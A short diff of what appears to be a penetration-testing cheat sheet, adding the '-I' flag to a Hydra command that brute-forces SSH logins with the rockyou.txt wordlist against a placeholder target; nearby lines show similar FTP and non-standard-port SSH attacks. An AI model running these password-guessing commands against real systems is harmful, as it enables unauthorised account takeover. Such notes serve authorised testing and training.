@@ -22,7 +22,7 @@ $ hydra -L /full/path_to/user-name-list.txt -P /full/path_to/passwd-list.txt ftp
 
 ## SSH
 
-$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP ssh
+$ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP ssh -I
 
 $ hydra -f -l user_name -P /usr/share/wordlists/rockyou.txt Target_IP -s 2222 ssh
 
